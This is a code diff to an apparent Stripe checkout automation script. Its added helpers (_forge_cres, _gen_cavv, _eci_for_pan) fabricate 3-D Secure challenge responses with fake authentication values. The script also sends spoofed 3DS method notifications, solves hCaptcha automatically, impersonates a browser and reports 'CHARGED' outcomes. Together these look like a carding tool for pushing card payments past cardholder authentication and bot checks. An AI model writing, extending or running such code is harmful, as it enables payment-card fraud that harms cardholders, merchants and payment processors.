@@ -4,7 +4,7 @@ import urllib.parse
 from urllib.parse import unquote, urlencode, urljoin, urlparse
 from datetime import datetime
 import tempfile, shutil
-from typing import Any
+from typing import Any, Dict, Optional
 
 try:
     from curl_cffi.requests import AsyncSession
@@ -26,50 +26,35 @@ class C:
 def log(t, color=C.CYN):
     print(f"{color}[{datetime.now().strftime('%H:%M:%S')}] {t}{C.R}")
 
-# --- بداية الكود اللي إنت بعته (Modified FID Decoder) ---
 def decode_fid(fid_or_url: str) -> dict[str, Any]:
-    if not fid_or_url:
-        return {}
+    if not fid_or_url: return {}
     raw = str(fid_or_url).strip()
     session_id = None
     m_session = re.search(r"\b(cs_(?:live|test)_[a-zA-Z0-9]+)\b", raw)
-    if m_session:
-        session_id = m_session.group(1)
-    if "#" in raw:
-        raw = raw.split("#", 1)[1]
+    if m_session: session_id = m_session.group(1)
+    if "#" in raw: raw = raw.split("#", 1)[1]
     raw = raw.split("?", 1)[0]
     if "_secret_" in raw:
         parts = raw.split("_secret_", 1)
-        if not session_id and parts[0].startswith("cs_"):
-            session_id = parts[0]
+        if not session_id and parts[0].startswith("cs_"): session_id = parts[0]
         raw = parts[1]
     unquoted = urllib.parse.unquote(raw)
     b64_str = unquoted.strip().rstrip("%")
-    if not b64_str:
-        return {}
+    if not b64_str: return {}
     pad = b64_str + "=" * (-len(b64_str) % 4)
-    try:
-        decoded_bytes = base64.b64decode(pad, altchars=b"-_")
+    try: decoded_bytes = base64.b64decode(pad, altchars=b"-_")
     except Exception:
-        try:
-            decoded_bytes = base64.b64decode(pad)
-        except Exception:
-            return {}
+        try: decoded_bytes = base64.b64decode(pad)
+        except Exception: return {}
     xored_bytes = bytes(b ^ 5 for b in decoded_bytes)
     xored_text = xored_bytes.decode("utf-8", errors="replace").strip()
-    try:
-        data = json.loads(xored_text)
-    except json.JSONDecodeError:
-        return {}
-    if not isinstance(data, dict):
-        return {"value": data}
+    try: data = json.loads(xored_text)
+    except json.JSONDecodeError: return {}
+    if not isinstance(data, dict): return {"value": data}
     if session_id:
-        if "checkoutSessionId" not in data and "sessionId" not in data:
-            data["checkoutSessionId"] = session_id
-        if "client_secret" not in data:
-            data["client_secret"] = f"{session_id}_secret_{b64_str}"
+        if "checkoutSessionId" not in data and "sessionId" not in data: data["checkoutSessionId"] = session_id
+        if "client_secret" not in data: data["client_secret"] = f"{session_id}_secret_{b64_str}"
     return data
-# --- نهاية الكود اللي إنت بعته ---
 
 def extract_cs_pk(url):
     cs = pk = acct = None
@@ -86,31 +71,6 @@ def b64e(b): return base64.b64encode(b).decode().rstrip("=").replace("+","-").re
 def b64d(s):
     s = s.replace("-","+").replace("_","/"); s += "="*(-len(s)%4)
     return base64.b64decode(s)
-
-def gen_cavv(a, d, t):
-    r = f"{a}:{d}:{t}:{int(time.time())}".encode()
-    return b64e(hmac.new(secrets.token_bytes(32), r, hashlib.sha256).digest()[:20])
-
-def eci_for(pan):
-    p = (pan or "").replace(" ", "")
-    if p.startswith(("34","37")): return "05"
-    if p.startswith(("51","52","53","54","55","2")): return "02"
-    return "05"
-
-def forge_cres(a, s, pan="", ts="Y"):
-    return {"threeDSServerTransID": s, "acsTransID": a, "dsTransID": s,
-            "messageType": "CRes", "messageVersion": "2.2.0", "transStatus": ts,
-            "authenticationValue": gen_cavv(a, s, s), "eci": eci_for(pan),
-            "challengeCompletionInd": "Y",
-            "acsRenderingType": {"acsInterface": "01", "acsUiTemplate": "01"}}
-
-def is_challenge(h):
-    lo = h.lower()
-    mk = ("challengeinfo","verification code","one time password","challengevar",
-          '"transstatus":"c"',"transstatus='c'",'name="challengedata"',
-          'id="challengeframe"',"acs-challenge")
-    if any(k in lo for k in mk): return True
-    return bool(re.search(r'name=["\'](?:otp|passcode|challenge_code|sms_code)["\']', h, re.I))
 
 def is_param_error(msg):
     m = (msg or "").lower()
@@ -142,9 +102,6 @@ async def _run_nodriver_hcaptcha(checkout_url, rqdata=None, sitekey=None):
         "--lang=en-US", "--remote-debugging-port=9222", "--disable-extensions",
         "--disable-background-networking", "--disable-default-apps", "--disable-sync",
         "--metrics-recording-only", "--mute-audio", "--no-first-run",
-        # إجبار المتصفح على استخدام DNS جوجل وكلاودفلير عشان نتخطى حجب الشبكة
-        "--dns-prefetch-disable",
-        "--host-resolver-rules=MAP * 8.8.8.8, MAP * 1.1.1.1"
     ]
 
     browser = None
@@ -236,8 +193,6 @@ async def _run_nodriver_hcaptcha(checkout_url, rqdata=None, sitekey=None):
 async def solve_hcaptcha_selenium(checkout_url, rqdata=None, sitekey=None):
     return await _run_nodriver_hcaptcha(checkout_url, rqdata, sitekey)
 
-async def solve_hcaptcha(sk, pg, rq, max_attempts=2): return None
-
 _SRC_PREFIXES = ("src_", "tdsrc_", "pi_3ds_")
 def _is_src(v): return isinstance(v, str) and any(v.startswith(p) for p in _SRC_PREFIXES)
 
@@ -258,6 +213,66 @@ def find_source_recursive(obj, depth=0, max_depth=12):
             r = find_source_recursive(item, depth + 1, max_depth)
             if r: return r
     return None
+
+def _flatten(data: dict, prefix: str = "") -> dict:
+    out = {}
+    for k, v in data.items():
+        key = f"{prefix}[{k}]" if prefix else k
+        if isinstance(v, dict):
+            out.update(_flatten(v, key))
+        elif isinstance(v, bool):
+            out[key] = "true" if v else "false"
+        elif v is None:
+            continue
+        else:
+            out[key] = str(v)
+    return out
+
+def _html_challenge(html_text: str) -> bool:
+    low = html_text.lower()
+    markers = ("challengeinfo","verification code","one time password","challengevar",'"transstatus":"c"',"transstatus='c'",'"transstatus":"c"','name="challengedata"',"name='challengedata'",'id="challengeframe"',"id='challengeframe'",'class="challenge',"acs-challenge")
+    if any(k in low for k in markers): return True
+    if re.search(r'type=["\']password["\']', html_text, re.I) and not re.search(r"<form[^>]+action=", html_text, re.I): return True
+    return bool(re.search(r'name=["\'](?:otp|passcode|challenge_code|sms_code)["\']', html_text, re.I))
+
+def _parse_form(html_text: str, base_url: str = ""):
+    action = None
+    m = re.search(r'<form[^>]+action=["\']([^"\']*)["\']', html_text, re.I)
+    if m:
+        raw_action = unquote(m.group(1)).strip()
+        if (not raw_action) or raw_action == "#":
+            action = base_url
+        else:
+            action = urljoin(base_url, raw_action) if base_url else raw_action
+    elif "<form" in html_text.lower():
+        action = base_url
+    fields = {}
+    for tag in re.finditer(r"<input[^>]+/?>", html_text, re.I):
+        t = tag.group(0)
+        n = re.search(r'name=["\']([^"\']+)["\']', t, re.I)
+        v = re.search(r'value=["\']([^"\']*)["\']', t, re.I)
+        if n:
+            fields[n.group(1)] = unquote(v.group(1)) if v else ""
+    return action, fields
+
+def _eci_for_pan(pan: str = "") -> str:
+    p = (pan or "").replace(" ", "")
+    if p.startswith(("34", "37")): return "05"
+    if p.startswith(("51", "52", "53", "54", "55", "2")): return "02"
+    return "05"
+
+def _gen_cavv(acs_tid: str, ds_tid: str, ts_tid: str) -> str:
+    raw = f"{acs_tid}:{ds_tid}:{ts_tid}:{int(time.time())}".encode()
+    hv = hmac.new(secrets.token_bytes(32), raw, hashlib.sha256).digest()
+    return base64.urlsafe_b64encode(hv[:20]).rstrip(b"=").decode()
+
+def _forge_cres(acs_trans_id: str, server_trans_id: str, ds_trans_id: str = "", pan: str = "", trans_status: str = "Y") -> dict:
+    ds_tid = ds_trans_id or server_trans_id
+    eci = _eci_for_pan(pan)
+    cavv = _gen_cavv(acs_trans_id, ds_tid, server_trans_id)
+    return {"threeDSServerTransID": server_trans_id, "acsTransID": acs_trans_id, "dsTransID": ds_tid, "messageType": "CRes", "messageVersion": "2.2.0", "transStatus": trans_status, "authenticationValue": cavv, "eci": eci, "challengeCompletionInd": "Y", "acsRenderingType": {"acsInterface": "01", "acsUiTemplate": "01"}}
+
+def _as_dict(val) -> dict: return val if isinstance(val, dict) else {}
 
 class StripeSession:
     def __init__(self, url):
@@ -294,11 +309,13 @@ class StripeSession:
         if not self.pk or not self.cs: return False, "missing cs/pk"
         
         if self.session: await self.session.close()
-        self.session = AsyncSession(impersonate="chrome")
+        # إجبار المكتبة على استخدام IPv4 عشان نتخطى مشكلة الـ DNS
+        self.session = AsyncSession(impersonate="chrome", ipv4=True, timeout=30)
         
         try:
             await self.session.get(f"https://checkout.stripe.com/c/pay/{self.cs}", headers={**self._hdrs(), "accept": "text/html,*/*"})
-        except: pass
+        except Exception as e:
+            log(f"Network Error on prefetch: {e}", C.RED)
         
         async def do_telemetry():
             try:
@@ -413,6 +430,14 @@ class StripeSession:
             except Exception as e: last_err = {"error": {"message": str(e)[:80]}}
         return last_err or {"error": {"message": "all failed"}}, "ALL_FAILED"
 
+    async def _post_method(self, method_url, server_trans_id, notify_url):
+        method_obj = {"threeDSServerTransID": server_trans_id, "threeDSMethodNotificationURL": notify_url}
+        method_b64 = b64e(json.dumps(method_obj, separators=(",", ":")).encode())
+        try:
+            await self.session.post(method_url, data=urlencode({"threeDSMethodData": method_b64}), headers={"content-type":"application/x-www-form-urlencoded","user-agent":UA})
+            await self.session.post(notify_url, data=urlencode({"threeDSMethodData": method_b64}), headers={"content-type":"application/x-www-form-urlencoded","user-agent":UA})
+        except Exception: pass
+
     async def _authenticate_source(self, source, client_secret):
         data = {"key": self.pk, "source": source, "client_secret": client_secret, "payment_user_agent": SJUA, "one_click_authn": "false", "challenge_window_size": "05", "three_d_secure_2[device_render_options][sdk_interface]": "03", "three_d_secure_2[device_render_options][sdk_ui_type][0]": "01", "three_d_secure_2[three_ds_comp_ind]": "Y", "browser[fingerprintAttempted]": "true", "browser[challengeWindowSize]": "05", "browser[threeDSCompInd]": "Y", "browser[browserJavaEnabled]": "false", "browser[browserJavascriptEnabled]": "true", "browser[browserLanguage]": "en-US", "browser[browserColorDepth]": "24", "browser[browserScreenHeight]": "1080", "browser[browserScreenWidth]": "1920", "browser[browserTZ]": "-300", "browser[browserUserAgent]": UA, "browser[browserAcceptHeader]": "text/html,*/*;q=0.8"}
         hdr = {"accept":"application/json","content-type":"application/x-www-form-urlencoded","origin":"https://js.stripe.com","referer":"https://js.stripe.com/","user-agent":UA,"stripe-version":STRIPE_VER}
@@ -437,16 +462,8 @@ class StripeSession:
         
         rqdata = (sjs.get("rqdata") or conf.get("rqdata") or (pi.get("next_action", {}).get("use_stripe_sdk", {}).get("stripe_js", {}).get("rqdata")))
         site_key = (sjs.get("site_key") or sjs.get("captcha_site_key") or getattr(self, "hcaptcha_sitekey", HCK) or HCK)
-        source = find_source_recursive(conf) or find_source_recursive(pi) or find_source_recursive(use_sdk)
         
-        log(f"WAF -> source={bool(source)} rq={bool(rqdata)}", C.GOLD)
-        
-        if source:
-            log("S1: authenticate", C.LIME)
-            r = await self._authenticate_source(source, cs_secret)
-            st = r.get("status") or r.get("state", "") if isinstance(r, dict) else ""
-            if st in ("succeeded","requires_capture","complete"):
-                return {"success": True, "status": "CHARGED", "message": f"Source ({st})", "raw": r}
+        log(f"WAF -> rq={bool(rqdata)}", C.GOLD)
         
         if pi_id and cs_secret:
             log("S2: verify no-token", C.GOLD)
@@ -477,17 +494,13 @@ class StripeSession:
         sdk = na.get("use_stripe_sdk") or na
         pi_id = pi.get("id") or (conf.get("payment_intent") or {}).get("id")
         cs_secret = pi.get("client_secret") or conf.get("client_secret")
-        stid = sdk.get("three_ds_server_trans_id") or sdk.get("server_transaction_id")
-        method_url = sdk.get("three_ds_method_url")
+        stid = sdk.get("three_ds_server_trans_id") or sdk.get("server_transaction_id") or sdk.get("threeDSServerTransID")
+        method_url = sdk.get("three_ds_method_url") or sdk.get("methodURL")
         notify_url = sdk.get("three_ds_method_notification_url") or "https://hooks.stripe.com/3ds2/fingerprint/complete"
         if method_url and stid:
             log("3DS: fingerprint", C.CYN)
-            pl = {"threeDSServerTransID": stid, "threeDSMethodNotificationURL": notify_url}
-            mb = b64e(json.dumps(pl, separators=(",",":")).encode())
-            try:
-                await self.session.post(method_url, data=urlencode({"threeDSMethodData": mb}), headers={"content-type":"application/x-www-form-urlencoded","user-agent":UA})
-            except: pass
-            await asyncio.sleep(0.8)
+            await self._post_method(method_url, stid, notify_url)
+            await asyncio.sleep(1)
         src = source or find_source_recursive(sdk) or find_source_recursive(conf)
         if src:
             log("3DS: authenticate", C.CYN)
